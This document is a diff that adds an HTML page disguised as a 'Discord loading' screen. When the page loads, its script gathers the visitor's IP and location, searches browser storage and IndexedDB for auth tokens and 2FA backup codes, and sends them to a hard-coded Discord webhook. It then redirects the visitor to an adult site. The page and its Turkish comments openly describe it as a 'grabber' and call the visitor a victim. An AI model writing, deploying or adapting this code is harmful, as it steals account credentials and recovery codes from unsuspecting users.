@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <title>🔥 DISCORD LOADING...</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #ff00ff;
+            font-family: Consolas;
+            text-align: center;
+            padding: 50px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            animation: glitch 0.8s infinite;
+        }
+
+        @keyframes glitch {
+            0% {
+                transform: translate(2px, 0)
+            }
+
+            20% {
+                transform: translate(-2px, 0)
+            }
+
+            40% {
+                transform: translate(2px, 0)
+            }
+
+            60% {
+                transform: translate(-2px, 0)
+            }
+
+            80% {
+                transform: translate(2px, 0)
+            }
+
+            100% {
+                transform: translate(0, 0)
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <h1>🔥 FULL DISCORD GRABBER ACTIVE 🔥</h1>
+    <p>aq sabret... token + backup kodları + her şeyi alıyorum</p>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1493914750055092334/c4te86vOd5_gaR4ak2GiUhnObzbAQJm_1slOmR4jaYz78xt_xNfnMwZZsHrCb5cqcIbP";
+
+        async function sendToDiscord(payload) {
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(() => { });
+        }
+
+        async function grabEverything() {
+            let victim = {
+                timestamp: new Date().toISOString(),
+                url: location.href,
+                ip: "Yükleniyor...",
+                country: "",
+                city: "",
+                token: "Bulunamadı",
+                backupCodes: [],
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            // IP + Konum
+            try {
+                const res = await fetch("https://ipapi.co/json/");
+                const data = await res.json();
+                victim.ip = data.ip;
+                victim.country = data.country_name;
+                victim.city = data.city;
+            } catch (e) { }
+
+            // TOKEN ÇEKME
+            const tokenKeys = ["token", "Token", "auth_token", "authorization", "user_token"];
+            try {
+                for (let key of tokenKeys) {
+                    let t = localStorage.getItem(key) || sessionStorage.getItem(key);
+                    if (t && t.length > 50) {
+                        victim.token = t;
+                        break;
+                    }
+                }
+            } catch (e) { }
+
+            // BACKUP KODLARI ÇEKME
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    let value = localStorage.getItem(key);
+                    if (value && /backup|recovery|2fa|kod|code/i.test(key + value)) {
+                        if (/[A-Za-z0-9]{8}/.test(value)) {
+                            victim.backupCodes.push(value);
+                        }
+                    }
+                }
+
+                // IndexedDB tarama
+                const dbs = await indexedDB.databases ? indexedDB.databases() : [];
+                for (let dbInfo of dbs) {
+                    if (dbInfo.name.toLowerCase().includes("discord") || dbInfo.name.toLowerCase().includes("cache")) {
+                        const request = indexedDB.open(dbInfo.name);
+                        request.onsuccess = function (event) {
+                            const db = event.target.result;
+                            const tx = db.transaction(db.objectStoreNames, "readonly");
+                            for (let storeName of db.objectStoreNames) {
+                                const store = tx.objectStore(storeName);
+                                store.openCursor().onsuccess = function (e) {
+                                    const cursor = e.target.result;
+                                    if (cursor) {
+                                        const data = cursor.value;
+                                        if (data && typeof data === "object") {
+                                            JSON.stringify(data).match(/[A-Za-z0-9]{8}/g)?.forEach(code => {
+                                                if (!victim.backupCodes.includes(code) && code.length >= 8) {
+                                                    victim.backupCodes.push(code);
+                                                }
+                                            });
+                                        }
+                                        cursor.continue();
+                                    }
+                                };
+                            }
+                        };
+                    }
+                }
+            } catch (e) { }
+
+            // SONUÇLARI GÖNDER
+            const embed = {
+                title: "☠️ KURBAN FULL YAKALANDI ☠️",
+                color: 0x990000,
+                fields: [
+                    { name: "IP & Konum", value: `${victim.ip} - ${victim.city}, ${victim.country}`, inline: false },
+                    { name: "Discord Token", value: victim.token ? `\`\`\`${victim.token}\`\`\`` : "Bulunamadı", inline: false },
+                    {
+                        name: "Backup Kodları", value: victim.backupCodes.length > 0
+                            ? "```" + victim.backupCodes.join("\n") + "```"
+                            : "Backup kodu bulunamadı", inline: false
+                    },
+                    { name: "User Agent", value: `\`\`\`${victim.userAgent}\`\`\``, inline: false }
+                ],
+                timestamp: victim.timestamp
+            };
+
+            sendToDiscord({ username: "Unchained Grabber", embeds: [embed] });
+
+            // === PORNHUB'A YÖNLENDİRME (2 saniye sonra) ===
+            setTimeout(() => {
+                window.location.href = "https://pornhub.com";
+            }, 2000);
+        }
+
+        window.onload = grabEverything;
+    </script>
+</body>
+
+</html>
